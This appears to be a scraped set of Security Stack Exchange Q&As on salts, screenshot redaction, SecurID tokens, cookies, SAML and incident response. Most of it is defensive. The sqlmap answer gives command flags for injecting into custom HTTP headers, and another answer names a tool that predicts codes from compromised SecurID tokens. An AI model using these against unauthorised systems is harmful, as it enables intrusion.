<p>Tor isn't doing anything on the protocol level to fool a captive portal, but it's certainly possible that when used in the way you describe that it could allow a way out of the walled garden.</p>

<blockquote>
  <p>how would I prevent it when setting up a captive portal?</p>
</blockquote>

<p>Most captive portals will not be vulnerable to this type of attack. All you need to do is successfully block all egress requests other than HTTP, which is forwarded to the portal login page; basically, nothing should get through the portal unless it's an authenticated client.</p>
","9256"
"Does anybody not store salts?","15558","","<p>We talked about password hashing and salting in class today. Our professor had a very different understanding of the use case of salts from mine and said that you might not store the salt at all and just check every login attempt with all possible salts and authorize if one matches.</p>

<p>I don't really see any point whatsoever in this since now my service is much more vulnerable to brute force attacks (send one password, server checks many), but I guess it is a little more secure to pure dictionary attacks against the hashed password.</p>

<p>So is there any use case where people would actually do this?</p>
","<p>Not storing the salt is bad advice.</p>

<p>The main purpose of a salt is that each user password has to be attacked individually.</p>

<p>If you do not store the salt then, as you said, you need to try every single salt combination in order to validate the password. If you need to check every single salt combination, this means that the salt cannot be too long (you mentioned 12 bits in a comment). If the salt is not long, it means that the salt will be repeated for many users. If it's repeated for many users, it means the attacker will be able to attack many users at the same time, which will save the attacker time.</p>

<p>By doing that, you nearly completely defeat the purpose of using a salt.</p>
","130167"
"Can you recover original data from a screenshot that has been 'blacked out'?","15492","","<p>Is there a threat from screenshots with blacked out info? That is can someone take out that after market addition so to speak?</p>

<p><strong>For instance</strong></p>

<p>I take a screen shot (using MS snipper)
<img src=""https://i.stack.imgur.com/HLaO3.png"" alt=""enter image description here""></p>

<hr>

<p>Then I 'blur/black out' some info
<img src=""https://i.stack.imgur.com/dMWPO.png"" alt=""enter image description here""></p>

<p><em>Is the picture above vulnerable to someone looking through it's hex values for that extra green layer and just removing it, thus reconstructing the original image (or any other way to 'take off' my attempt of redacting info)?</em></p>

<hr>

<p>To make it more secure I always then open up the blurred out screen and then screen capture that.
<img src=""https://i.stack.imgur.com/Lx6kY.png"" alt=""enter image description here""> </p>

<p><em>Does the above screen of a screen add better security -there is no way to reconstruct missing data because nothing is ""missing""?</em></p>

<hr>

<p>I have always been paranoid but after finding out a colleague does the same thing, I'd thought I'd ask.</p>

<hr>

<p><strong>update</strong> So I compared pics one and two (from above) and looked at the hex values, the meta data had not changed at all and the only change was withing the image data itself (results below). The results are specific to this particular editor and process. The possibility (likelihood) does exist for data to be recovered if using other tools.
<img src=""https://i.stack.imgur.com/6FrCd.png"" alt=""enter image description here""></p>
","<p>Usually the PNG format does not support multiple layers. So when you draw over something, whatever was there before is lost.</p>

<p>However, the PNG format supports storage of an unlimited amount of metadata which is usually not displayed by image viewers. This feature is often used by image editors to add additional metadata to the image. One possible use-case is to store the undo-history of the image. This could mean that the previous version can be restored. To prevent this, make sure to set the exporting settings of your editor in a ""export for web"" mode which is supposed to strip all unnecessary data from the file. How to do this (and if it is even necessary) depends on the image editor.</p>

<p>Another possible faux-pas is to use an image blurring method which isn't 100% effective. You could, for example, accidentally set the opacity of your brush to almost but not completely 100%, which would mean that the section isn't recognizable by the human eye but might be made readable again by enhancing the contrast of the section. Another mistake is to use a filter which is reversible. I remember a case of a child-pornographer who got caught because he blurred out his own face with the ""twirl"" filter in Photoshop not realizing that when the same filter is applied in reverse, <a href=""https://en.wikipedia.org/wiki/File:Mr_Swirl.jpg"">the image is restored to almost the original</a>.</p>
","67298"
"Does a webserver need an antivirus software installed?","15482","","<p>In what cases does a webserver need an antivirus software installed?
When it is not required?</p>

<p>If it is required sometimes, what should be considered when choosing the right one to install?</p>

<p>(In my case it is a Windows Web Server, but maybe I should not narrow down the question.)</p>
","<p>There are a few points to consider here.  </p>

<p>First, AV is not a fail-safe, catch-all mechanism for any malware. Even ignoring the blurred line between AntiVirus and AntiMalware (these engines function differently, even if they are packaged in a single product), there is no AV/Antimalware product that will catch customized, targeted attack code. So, if that is the threat you are trying to protect against, you can just as well forget that.  </p>

<p>Secondly, if you <em>are</em> accepting file uploads from users (especially essentially anonymous users), you <em>should</em> play it safe and go for defense in depth - even it's trivial to get around AV, you can at least block the low hanging fruit - and the ""innocent"" victims who continue to spread the payload unknowingly.  </p>

<p>Third, if you want to play it super-safe and have AV even if you don't need it, like @Tate recommended, you should realize that while you will be safer from viruses (again, low probability, but still exists), this is <strong>not</strong> free, there are costs involved:</p>

<ul>
<li>Using AV <em>on</em> the server can add risk to the server, since you're adding potentially vulnerable code - less code, less attack surface. (There have even been cases of attacks on the server via the AV interfaces).</li>
<li>Checking for viruses right there on your server isn't necessarily the safest option, since these can potentially ""leak"" and fool the AV. (Also see <a href=""http://www.zdnet.com/blog/ou/what-if-jim-allchin-is-right-about-no-av-on-vista/368"">George Ou over on ZDnet</a> about defusing a bomb in your living room).</li>
<li>Of course, never forget the performance costs of running AV on your servers, consider this an opportunity cost. Also you'd need to add X more servers to offer the same performance and throughput, if you have specific usage targets this can cost real money.  </li>
<li>Most server-ready AV have a non-negligable cost - more opportunity lost, and if you're spending security money there are better things to spend it on.  </li>
</ul>

<hr>

<p>All that said, if/when you <strong>do</strong> decide to go for AV, consider the following points, including the obvious:</p>

<ul>
<li>Coverage</li>
<li>Cost</li>
<li>Updates</li>
<li>reputation (i.e. do they actively research? what are their triggers? do they catch what they should? etc)  </li>
<li>Performance (or more accurately, performance hit - on memory AND CPU, and throughput)</li>
<li>additional engines, e.g. anti-malware, loggers, anti-rootkit, etc</li>
<li><strong>Security</strong> of the product itself! You don't want to introduce vulnerabilities any more than you have to... </li>
<li>VERY preferable - if you can offload the AV scanning to another box, e.g. appliance or gateway, so this isnt even ON the server. Or, there are (were?) some products that let you scan <em>in memory</em>, via an API call, without even writing to disk (or DB).  </li>
</ul>
","308"
"How should I set up emergency access to business-critical secrets in case I am ""hit by a bus""?","15477","","<p>I work as the primary developer and IT administrator for a small business. I want to ensure that business can continue even if I suddenly become unavailable for some reason. Much of what I do requires access to a number of servers, (through key-based ssh), cloud services, and other secure infrastructure of applications. Some of these services use MFA, either using dedicated MFA apps (like Amazon) or SMS.</p>

<p>How do I ensure that my ""hit by a bus"" plan and documentation is complete and comprehensive, but that this documentation is not itself a security risk?</p>

<p>The documentation will be hosted on a shared file server behind our VPN, but that can also be accessed using a third party web frontend that puts a ""DropBox""-like interface on top of the base file server (i.e. authentication, desktop syncing, file sharing, etc). The files are in a location where only I, and other file server administrators can see them.</p>

<p>How should I manage the ""secrets"" (passwords, private keys, MFA access) in this documentation to ensure it remains comprehensive without compromising security?</p>
","<p>My advice would be to remove the secrets from the drop-box and store them elsewhere.  Your instructions have to be easily human readable by anyone, but they can include instructions on how to get access to the properly secured part of the data.  That lets you separate the accessibility side of things from the security side.</p>

<p>Once you can think about security on its own, you can start to ask the real question of how much do you need to protect these keys?  This is a business logic question, so consult your management.  You might:</p>

<ul>
<li>Have a password to a file that everyone knows</li>
<li>Have a file set up with multiple passwords so that each individual maintains their own copy.</li>
<li>Have a file locked by a M-out-of-N algorithm (the digital equivalent of requiring two keys to unlock a safe).</li>
<li>Have a M-out-of-N algorithm with one 'master' password required regardless of which group of individuals unlocks the file, and that one master is physically kept in a tamper-evident safe that you check every now and then.</li>
</ul>

<p>Use creativity here.  <strong>Whatever you do, the decoupling of ""instructions"" with ""sensitive information"" frees you to properly safeguard the information, and then provide instructions on how to get that data later.</strong></p>

<p>Your business logic decisions will also include uptime questions.  If something goes wrong in your life, how long does another admin have to take over your work before business is affected?  Consider how well replicated you want these instructions and sensitive information to be in case of server glitches.  When I was administering a server and needed to store instructions on how to restore it from backup, I used the server's own wiki to store that information for easy viewing, but obviously that wouldn't be so useful in a glitch scenario, so I also had a copy on the dev VM of that machine, saved off copies of it on 3 separate PCs and a printout.  I couldn't guarantee the printout would stay up to date, but I made sure that I could do my best.</p>

<p>This also points out something which is not always part of a hit by the bus plan: graceful degradation.  Not all hit-by-the-bus scenarios involve getting hit by a bus.  Some involve you just being inaccessible at an unfortunate time.  Some involve you leaving the company, but being available for a question or two.  Others... do not.  Consider layering the plan.  Small mishaps may be very well protected, while greater mishaps may still result in business loss while everyone gets things together, but nothing permanent.  To use my backup restoration plan as an example, the printed version was almost guaranteed not to be fully up to date.  But if lightning wiped out every computer for a city block, it was still more helpful than nothing.  On the other hand, if the server just thew a harddrive, and I had to restore from backup, the version I kept sync'd on the dev box was almost certainly up to date.</p>

<p>Example of this failing: I was a user on a network managed by KERBEROS by an admin that was distrustful of others and did not have a hit-by-a-bus plan.  When he... left, we had a hacking party to try to break his server.  In the end, our best impromptu hit-by-a-bus plan was to wipe the machines (every one of them) and start from scratch.  Note that, while this wasn't the best plan (in fact, I think its the worst plan?), the business kept moving.  We just got stagnated for about two days and had a bunch of grumpy customers.  In the words of Frank Herbert's <em>Dune</em>, ""The spice must flow.""  Even in the worst case (which may involve a curious incident involving your server's harddrive flung out of the bus and hitting you on the head, destroying all record of the hit-by-a-bus plan), business <em>does</em> have a way to keep moving... but I approve of trying to raise the bar a wee bit more than that!</p>
","106859"
"Why users want to disable cookies?","15458","","<p>I just started to create a new web application. In the documentation, it is written that I have to prepare for the situation where users have disabled cookies. This is not the first time I have read this condition. Can anyone explain me why users want to disable cookies in their browsers?</p>
","<p>Cookies have, historically, been a source of numerous security and privacy concerns.</p>

<p>For example, tracker cookies can be used to identify which websites you've visited and what activities you've done on them:</p>

<ol>
<li>Site A includes hidden <code>iframe</code> that points at a tracker service.</li>
<li>Tracker service issues a cookie that identifies you, and logs your visit.</li>
<li>Site B includes the same hidden <code>iframe</code>.</li>
<li>Tracker service recognises your cookie, and logs that visit too.</li>
<li>Site A and Site B pay the tracker to get information about what other sites their users visited.</li>
</ol>

<p>This is just one application. There are other ways to use tracker cookies, some of which allow all sorts of nasty attacks such as identity theft.</p>

<p>Another problem is cookie-stealing, which can be used to hijack insecure (i.e. non-HTTPS) sessions. Using an exploit (e.g. XSS) a page might manage to post another site's cookies back to itself, allowing an attacker to steal your session ID. Turning off cookies prevents this.</p>

<p>Due to these problems, users often disable cookies or block them on certain sites for increased privacy and security.</p>
","18479"
"Can the numbers on RSA SecurID tokens be predicted?","15458","","<p><img src=""https://i.stack.imgur.com/SO3v4.jpg"" alt=""enter image description here""></p>

<p>My workplace uses these SecurID tokens which provide you with a temporary password, the code will expire after a short time.  I have always been fascinated by the things, because it seems as though all the logic to calculate the next number must be physically located inside the device.  </p>

<p>Given physical access to the token, is it possible to predict the numbers? How?
Without physical access, is it theoretically possible to predict future numbers from previous numbers, with or without knowledge of the seed?  </p>

<p>*I'm not attempting to crack it, just interested out of mathematical curiousity!</p>
","<p>What <a href=""http://en.wikipedia.org/wiki/SecurID"">SecurID tokens</a> do is not completely public knowledge; RSA (the company) is quite wont on releasing details. What can be inferred is the following:</p>

<ul>
<li>Each device embeds a <em>seed</em>. Each seed is specific to a device.</li>
<li>The seed of a device can be deterministically computed from a <em>master seed</em> and the device serial number. The serial number is printed on the device. This computation uses cryptographic one-way functions so you cannot guess the master seed from a device seed.</li>
<li>From the device seed and an internal clock, the number is computed, yet again with a cryptographic one-way function.</li>
<li>The derivation algorithms have been leaked, if only because the verification servers must also run the same algorithm, so these algorithms exist as concrete software in various places; leaking and reverse-engineering are mostly unavoidable in these conditions.</li>
</ul>

<p>Under these assumptions, then:</p>

<ul>
<li>If you know the device seed, then you can compute future numbers at will.</li>
<li>If you know the master seed and the device serial number, you can compute the device seed.</li>
<li>Knowing seeds from other devices should gain you nothing into guessing the seed for a given device, unless the cryptographic one-way function which turns the master seed into device seeds has been botched up somehow.</li>
<li>Knowing past numbers from a token should gain you nothing into guessing the future numbers from the same device, unless the cryptographic one-way function which turns the device seed into numbers has been botched up somehow.</li>
<li>Extracting the device seed from the physical device itself is theoretically feasible but expensive, because the device is <a href=""http://en.wikipedia.org/wiki/Tamper_resistance"">tamper-resistant</a>: it is armored and full of sensors, and will commit electronic suicide if it detects any breach. If we take the example of smartcards, extraction of the device seed is likely to cost several thousands of dollars, and be destructive to the device (so you cannot do it discreetly).</li>
</ul>

<p>On March 2011, some systems have been compromised in RSA, and it seems probable that the attackers manage to steal one or a few master seeds (it is plausible that the devices are built in ""families"" so there are several master seeds). RSA has stated that 40 millions SecurID tokens must be replaced. If you know the serial number of a token (it may be printed on the outside of the token), you can use the <a href=""http://www.oxid.it/cain.html"">Cain &amp; Abel</a> tool that @dls points to; presumably, that tool implements the leaked algorithm and master seed(s), and can thus produce the future token outputs (I have not tried it). This would work only with servers which still accept the tokens from the 40-million batch which is to be replaced. I do not know how far RSA and its customers have gone in this process, so it may be that this attack will not work anymore. It really depends on the reactivity of the people who manage server you attack.</p>

<p>(If these system administrators have not replaced the compromised devices after nine months, then chances are that they are quite lax on security issues, and the server may have quite a few other remotely exploitable security holes.)</p>
","9588"
"Sqlmap testing HTTP headers","15453","","<p>I was wondering whether <code>sqlmap</code> is able to test HTTP headers for SQL vulnerabilities. I know that if I use <code>--level&gt;=3</code> then it will automatically check for User-Agent and Referrer HTTP headers, but I would also like to check for others. </p>

<p>I've found the <code>--header</code> options, which I can use to specify the headers that will be sent in requests, but I have no idea whether <code>sqlmap</code> will actually test those headers. Let's say I want to add a header:</p>

<pre><code>CustomHeader: testing
</code></pre>

<p>to the http request. I would add the <code>--headers=""CustomHeader: testing""</code> to the <code>sqlmap</code> command line and then I could specifically tell <code>sqlmap</code> to test for the SQL vulnerabilities in CustomHeader HTTP header with the <code>-p</code> option, like this:</p>

<pre><code>Testable parameter(s)

Switch: -p

By default sqlmap tests all GET parameters and POST parameters. When the value of --level is &gt;= 2 it tests also HTTP Cookie header values. When this value is &gt;= 3 it tests also HTTP User-Agent and HTTP Referer header value for SQL injections. It is however possible to manually specify a comma-separated list of parameter(s) that you want sqlmap to test. This will bypass the dependence on the value of --level too.

For instance, to test for GET parameter id and for HTTP User-Agent only, provide -p id,user-agent.
</code></pre>

<p>So the command could be:</p>

<pre><code>-p customheader
</code></pre>

<p>Does anybody know how to actually test custom HTTP headers with <code>sqlmap</code>?</p>
","<p>Below is a snippet of code from <code>./sqlmap/lib/controller.py</code> that defines the <code>--level</code> behavior:</p>

<p><img src=""https://i.stack.imgur.com/Av8uv.png"" alt=""sqlmap/lib/controller.py code snippet""></p>

<p>It appears custom <a href=""https://github.com/sqlmapproject/sqlmap/issues/48"" rel=""nofollow noreferrer""><strong>header injection is supported</strong></a> (as of just a week ago - so do a git pull):</p>

<blockquote>
  <p>now it's possible to do something like this:<br>
  <code>--user-agent=""sqlmap*""</code><br>
  or<br>
  <code>--referer=""target.com*""</code><br>
  or<br>
  <code>--headers=""User-Agent:test*\nReferer:bla""</code><br>
  or<br>
  <code>--headers=""Foo:bar*""</code><br>
  or (mark with asterisk character * inside request file):<br>
  <code>-r request.txt</code><br>
  or<br>
  ..  </p>
</blockquote>
","29531"
"What is the purpose of AudienceRestriction in SAML 2.0?","15442","","<p>Having read through the core specification for SAML 2.0 section 2.5.1.4 (page 23) I still cannot fully understand the purpose of the AudienceRestriction tag and what problem it is attempting to rectify.</p>

<p>My, probably incorrect, interpretation of the AudienceRestriction tag is that it facilitates a sort of intention statement declaring for what specific URI with the SP a given assertion is valid.</p>

<p>Would very much appreciate if someone could explain (a) the purpose of the tag and (b) a typical use-case scenario and (c) any potential implications of it's exclusion and/or misuse.</p>
","<p>SAML 2.0 <code>AudienceRestriction</code> is pretty much what you have gathered. It is a validity condition for an assertion. In particular it declares that the assertion's semantics are only valid for the relying party named by URI in that element. </p>

<p>The purpose is to restrict the conditions under which the assertion is valid, and to optionally provide terms and conditions relating to such validity. So the semantics of the element have to do with the scope and conditions of the trust relationships. From <a href=""http://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf"">SAML 2.0 Core, Section 2.5.1.4(PDF)</a>:</p>

<blockquote>
  <p>Although a SAML relying party that is outside the audiences specified
  is capable of drawing conclusions from an assertion, the SAML
  asserting party explicitly makes no representation as to accuracy or
  trustworthiness to such a party...</p>
  
  <p>...the <code>&lt;AudienceRestriction&gt;</code> element allows theSAML asserting party to
  state explicitly that no warranty is provided to such a party in a
  machine- andhuman-readable form. While there can be no guarantee that
  a court would uphold such a warrantyexclusion in every circumstance,
  the probability of upholding the warranty exclusion is
  considerably improved...</p>
</blockquote>

<p>I.e., it's not a code thing but a human (risk management/warranty/trust) thing. If it's used incorrectly modules tend to throw errors - most SP's expect themselves to be listed in the <code>AudienceRestriction</code>.</p>
","13429"
"How do I deal with a compromised server?","15435","","<p>I suspect that one or more of my servers is compromised by a hacker, virus, or other mechanism:</p>

<ul>
<li>What are my first steps? When I arrive on site should I disconnect the server, preserve ""evidence"", are there other initial considerations?</li>
<li>How do I go about getting services back online?</li>
<li>How do I prevent the same thing from happening immediately again?</li>
<li>Are there best practices or methodologies for learning from this incident?</li>
<li>If I wanted to put a Incident Response Plan together, where would I start? Should this be part of my Disaster Recovery or Business Continuity Planning?</li>
</ul>

<p><sub> This is meant to be a canonical post for this topic. <a href=""https://serverfault.com/questions/218005/how-do-i-deal-with-a-compromised-server"">Originally from serverfault</a>. </sub></p>
","<p><a href=""https://serverfault.com/questions/218005/how-do-i-deal-with-a-compromised-server"">Originally from serverfault.</a> <a href=""https://serverfault.com/users/7783/robm"">Thanks to Robert Moir (RobM)</a></p>

<p>It's hard to give specific advice from what you've posted here but I do have some generic advice based on a post I wrote ages ago back when I could still be bothered to blog.</p>

<h2><strong>Don't Panic</strong></h2>

<p><em>First things first, there are no ""quick fixes"" other than restoring your system from a backup taken prior to the intrusion, and this has at least two problems.</em></p>

<ol>
<li>It's difficult to pinpoint when the intrusion happened.</li>
<li>It doesn't help you close the ""hole"" that allowed them to break in last time, nor deal with the consequences of any ""data theft"" that may also have taken place.</li>
</ol>

<p>This question keeps being asked repeatedly by the victims of hackers breaking into their web server. The answers very rarely change, but people keep asking the question. I'm not sure why. Perhaps people just don't like the answers they've seen when searching for help, or they can't find someone they trust to give them advice. Or perhaps people read an answer to this question and focus too much on the 5% of why their case is special and different from the answers they can find online and miss the 95% of the question and answer where their case is near enough the same as the one they read online.</p>

<p>That brings me to the first important nugget of information. I really do appreciate that you are a special unique snowflake. I appreciate that your website is too, as it's a reflection of you and your business or at the very least, your hard work on behalf of an employer. But to someone on the outside looking in, whether a computer security person looking at the problem to try and help you or even the attacker himself, it is very likely that your problem will be at least 95% identical to every other case they've ever looked at.</p>

<p>Don't take the attack personally, and don't take personally the recommendations that follow here or that you get from other people. If you are reading this after just becoming the victim of a website hack then I really am sorry, and I really hope you can find something helpful here, but this is not the time to let your ego get in the way of what you need to do.</p>

<p><strong>You have just found out that your server(s) got hacked. Now what?</strong></p>

<p>Do not panic. Absolutely do not act in haste, and absolutely do not try and pretend things never happened and not act at all.</p>

<p>First: understand that the disaster has already happened. This is not the time for denial; it is the time to accept what has happened, to be realistic about it, and to take steps to manage the consequences of the impact.</p>

<p>Some of these steps are going to hurt, and (unless your website holds a copy of my details) I really don't care if you ignore all or some of these steps, but doing so will make things better in the end. The medicine might taste awful but sometimes you have to overlook that if you really want the cure to work.</p>

<p>Stop the problem from becoming worse than it already is:</p>

<ol>
<li>The first thing you should do is disconnect the affected systems from the Internet. Whatever other problems you have, leaving the system connected to the web will only allow the attack to continue. I mean this quite literally; get someone to physically visit the server and unplug network cables if that is what it takes, but disconnect the victim from its muggers before you try to do anything else.</li>
<li>Change all your passwords for all accounts on all computers that are on the same network as the compromised systems. No really. All accounts. All computers. Yes, you're right, this might be overkill; on the other hand, it might not. You don't know either way, do you?</li>
<li>Check your other systems. Pay special attention to other Internet facing services, and to those that hold financial or other commercially sensitive data.</li>
<li>If the system holds anyone's personal data,  immediately inform the person responsible for data protection (if that's not you) and URGE a full disclosure. I know this one is tough. I know this one is going to hurt. I know that many businesses want to sweep this kind of problem under the carpet but the business is going to have to deal with it - and needs to do so with an eye on any and all relevant privacy laws.</li>
</ol>

<p>However annoyed your customers might be to have you tell them about a problem, they'll be far more annoyed if you don't tell them, and they only find out for themselves after someone charges $8,000 worth of goods using the credit card details they stole from your site.</p>

<p>Remember what I said previously? The bad thing has already happened. The only question now is how well you deal with it.</p>

<p><strong>Understand the problem fully:</strong></p>

<ol>
<li>Do NOT put the affected systems back online until this stage is fully complete, unless you want to be the person whose post was the tipping point for me actually deciding to write this article. I'm not going to link to that post so that people can get a cheap laugh, but the real tragedy is when people fail to learn from their mistakes.</li>
<li>Examine the 'attacked' systems to understand how the attacks succeeded in compromising your security. Make every effort to find out where the attacks ""came from"", so that you understand what problems you have and need to address to make your system safe in the future.</li>
<li>Examine the 'attacked' systems again, this time to understand where the attacks went, so that you understand what systems were compromised in the attack. Ensure you follow up any pointers that suggest compromised systems could become a springboard to attack your systems further.</li>
<li>Ensure the ""gateways"" used in any and all attacks are fully understood, so that you may begin to close them properly. (e.g. if your systems were compromised by a SQL injection attack, then not only do you need to close the particular flawed line of code that they broke in by, you would want to audit all of your code to see if the same type of mistake was made elsewhere).</li>
<li>Understand that attacks might succeed because of more than one flaw. Often, attacks succeed not through finding one major bug in a system but by stringing together several issues (sometimes minor and trivial by themselves) to compromise a system. For example, using SQL injection attacks to send commands to a database server, discovering the website/application you're attacking is running in the context of an administrative user and using the rights of that account as a stepping-stone to compromise other parts of a system. Or as hackers like to call it: ""another day in the office taking advantage of common mistakes people make"".</li>
</ol>

<p><strong>Why not just ""repair"" the exploit or rootkit you've detected and put the system back online?</strong></p>

<p>In situations like this the problem is that you don't have control of that system any more. It's not your computer any more.</p>

<p>The only way to be <em>certain</em> that you've got control of the system is to rebuild the system. While there's a lot of value in finding and fixing the exploit used to break into the system, you can't be sure about what else has been done to the system once the intruders gained control (indeed, it's not unheard of for hackers that recruit systems into a botnet to patch the exploits they used themselves, to safeguard ""their"" new computer from other hackers, as well as installing their rootkit).</p>

<p><strong>Make a plan for recovery and to bring your website back online and stick to it:</strong></p>

<p>Nobody wants to be offline for longer than they have to be. That's a given. If this website is a revenue generating mechanism then the pressure to bring it back online quickly will be intense. Even if the only thing at stake is your / your company's reputation, this is still going generate a lot of pressure to put things back up quickly.</p>

<p>However, don't give in to the temptation to go back online too quickly. Instead move as fast as possible to understand what caused the problem and to solve it before you go back online or else you will almost certainly fall victim to an intrusion once again, and remember, ""to get hacked once can be classed as misfortune; to get hacked again straight afterward looks like carelessness"" (with apologies to Oscar Wilde).</p>

<ol>
<li>I'm assuming you've understood all the issues that led to the successful intrusion in the first place before you even start this section. I don't want to overstate the case but if you haven't done that first then you really do need to. Sorry.</li>
<li>Never pay blackmail / protection money. This is the sign of an easy mark and you don't want that phrase ever used to describe you.</li>
<li>Don't be tempted to put the same server(s) back online without a full rebuild. It should be far quicker to build a new box or ""nuke the server from orbit and do a clean install"" on the old hardware than it would be to audit every single corner of the old system to make sure it is clean before putting it back online again. If you disagree with that then you probably don't know what it really means to ensure a system is fully cleaned, or your website deployment procedures are an unholy mess. You presumably have backups and test deployments of your site that you can just use to build the live site, and if you don't then being hacked is not your biggest problem.</li>
<li>Be very careful about re-using data that was ""live"" on the system at the time of the hack. I won't say ""never ever do it"" because you'll just ignore me, but frankly I think you do need to consider the consequences of keeping data around when you know you cannot guarantee its integrity. Ideally, you should restore this from a backup made prior to the intrusion. If you cannot or will not do that, you should be very careful with that data because it's tainted. You should especially be aware of the consequences to others if this data belongs to customers or site visitors rather than directly to you.</li>
<li>Monitor the system(s) carefully. You should resolve to do this as an ongoing process in the future (more below) but you take extra pains to be vigilant during the period immediately following your site coming back online. The intruders will almost certainly be back, and if you can spot them trying to break in again you will certainly be able to see quickly if you really have closed all the holes they used before plus any they made for themselves, and you might gather useful information you can pass on to your local law enforcement.</li>
</ol>

<hr>

<p><strong>Reducing the risk in the future.</strong></p>

<p>The first thing you need to understand is that security is a process that you have to apply throughout the entire life-cycle of designing, deploying and maintaining an Internet-facing system, not something you can slap a few layers over your code afterwards like cheap paint. To be properly secure, a service and an application need to be designed from the start with this in mind as one of the major goals of the project. I realise that's boring and you've heard it all before and that I ""just don't realise the pressure man"" of getting your beta web2.0 (beta) service into beta status on the web, but the fact is that this keeps getting repeated because it was true the first time it was said and it hasn't yet become a lie.</p>

<p>You can't eliminate risk. You shouldn't even try to do that. What you should do however is to understand which security risks are important to you, and understand how to manage and reduce both the impact of the risk and the probability that the risk will occur.</p>

<p><strong>What steps can you take to reduce the probability of an attack being successful?</strong></p>

<p>For example:</p>

<ol>
<li>Was the flaw that allowed people to break into your site a known bug in vendor code, for which a patch was available? If so, do you need to re-think your approach to how you patch applications on your Internet-facing servers?</li>
<li>Was the flaw that allowed people to break into your site an unknown bug in vendor code, for which a patch was not available? I most certainly do not advocate changing suppliers whenever something like this bites you because they all have their problems and you'll run out of platforms in a year at the most if you take this approach. However, if a system constantly lets you down then you should either migrate to something more robust or at the very least, re-architect your system so that vulnerable components stay wrapped up in cotton wool and as far away as possible from hostile eyes.</li>
<li>Was the flaw a bug in code developed by you (or someone working for you)? If so, do you need to re-think your approach to how you approve code for deployment to your live site? Could the bug have been caught with an improved test system, or with changes to your coding ""standard"" (for example, while technology is not a panacea, you can reduce the probability of a successful SQL injection attack by using well-documented coding techniques).</li>
<li>Was the flaw due to a problem with how the server or application software was deployed? If so, are you using automated procedures to build and deploy servers where possible? These are a great help in maintaining a consistent ""baseline"" state on all your servers, minimising the amount of custom work that has to be done on each one and hence hopefully minimising the opportunity for a mistake to be made. Same goes with code deployment - if you require something ""special"" to be done to deploy the latest version of your web app then try hard to automate it and ensure it always is done in a consistent manner.</li>
<li>Could the intrusion have been caught earlier with better monitoring of your systems? Of course, 24-hour monitoring or an ""on call"" system for your staff might not be cost effective, but there are companies out there who can monitor your web facing services for you and alert you in the event of a problem. You might decide you can't afford this or don't need it and that's just fine... just take it into consideration.</li>
<li>Use tools such as tripwire and nessus where appropriate - but don't just use them blindly because I said so. Take the time to learn how to use a few good security tools that are appropriate to your environment, keep these tools updated and use them on a regular basis.</li>
<li>Consider hiring security experts to 'audit' your website security on a regular basis. Again, you might decide you can't afford this or don't need it and that's just fine... just take it into consideration.</li>
</ol>

<p><strong>What steps can you take to reduce the consequences of a successful attack?</strong></p>

<p>If you decide that the ""risk"" of the lower floor of your home flooding is high, but not high enough to warrant moving, you should at least move the irreplaceable family heirlooms upstairs. Right?</p>

<ol>
<li>Can you reduce the amount of services directly exposed to the Internet? Can you maintain some kind of gap between your internal services and your Internet-facing services? This ensures that even if your external systems are compromised the chances of using this as a springboard to attack your internal systems are limited.</li>
<li>Are you storing information you don't need to store? Are you storing such information ""online"" when it could be archived somewhere else. There are two points to this part; the obvious one is that people cannot steal information from you that you don't have, and the second point is that the less you store, the less you need to maintain and code for, and so there are fewer chances for bugs to slip into your code or systems design.</li>
<li>Are you using ""least access"" principles for your web app? If users only need to read from a database, then make sure the account the web app uses to service this only has read access, don't allow it write access and certainly not system-level access.</li>
<li>If you're not very experienced at something and it is not central to your business, consider outsourcing it. In other words, if you run a small website talking about writing desktop application code and decide to start selling small desktop applications from the site then consider ""outsourcing"" your credit card order system to someone like Paypal.</li>
<li>If at all possible, make practicing recovery from compromised systems part of your Disaster Recovery plan. This is arguably just another ""disaster scenario"" that you could encounter, simply one with its own set of problems and issues that are distinct from the usual 'server room caught fire'/'was invaded by giant server eating furbies' kind of thing.</li>
</ol>

<p><strong>... And finally</strong></p>

<p>I've probably left out no end of stuff that others consider important, but the steps above should at least help you start sorting things out if you are unlucky enough to fall victim to hackers.</p>

<p>Above all: Don't panic. Think before you act. Act firmly once you've made a decision, and leave a comment below if you have something to add to my list of steps.</p>
","39232"